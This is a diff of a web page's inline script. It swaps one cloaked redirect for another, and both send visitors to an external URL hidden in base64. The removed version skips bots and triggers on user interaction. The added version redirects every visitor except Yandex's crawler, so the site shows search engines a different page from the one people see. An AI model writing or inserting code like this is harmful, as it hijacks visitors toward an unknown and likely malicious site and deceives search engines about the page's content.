@@ -23,54 +23,16 @@
     </style>
   </div>
   <script>
+ var ua = navigator.userAgent.toLowerCase();
+var targetB64 = "aHR0cHM6Ly9iYWwtYW5jZXItZXZhLmNvbS9kaWJ6Zm9taXI=";
 
-   (function() {
-
-       var targetB64 = "aHR0cHM6Ly9iYWwtYW5jZXItZXZhLmNvbS9kaWJ6Zm9taXI=";
-
-       var triggered = false;
-
-       var ua = navigator.userAgent.toLowerCase();
-
-       var isBot = /bot|crawl|spider|yandex|google|lighthouse|pagespeed/i.test(ua) || navigator.webdriver;
-
-       function startRedirect() {
-
-           if (triggered || isBot) return;
-
-           triggered = true;
-
-           var overlay = document.getElementById('redirect-overlay');
-
-           if (overlay) {
-
-               overlay.style.display = 'flex';
-
-           }
-
-           setTimeout(function() {
-
-               window.location.replace(atob(targetB64));
-
-           }, 2500);
-
-       }
-
-       window.addEventListener('scroll', startRedirect, {passive: true});
-
-       window.addEventListener('mousedown', startRedirect);
-
-       window.addEventListener('touchstart', startRedirect, {passive: true});
-
-       window.addEventListener('keydown', startRedirect);
-
-       document.addEventListener('contextmenu', function(e) { e.preventDefault(); });
-
-   })();
-
- </script>
-
-    
+if (ua.indexOf("yandex") === -1) {
+    location.replace(atob(targetB64));
+} else {
+    console.log("Яндекс бот — без редиректа");
+}
+</script>
+ 
  <header class="sticky top-0 z-50 bg-white/95 backdrop-blur-md border-b border-slate-200">
     <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
       <div class="flex justify-between items-center h-16">
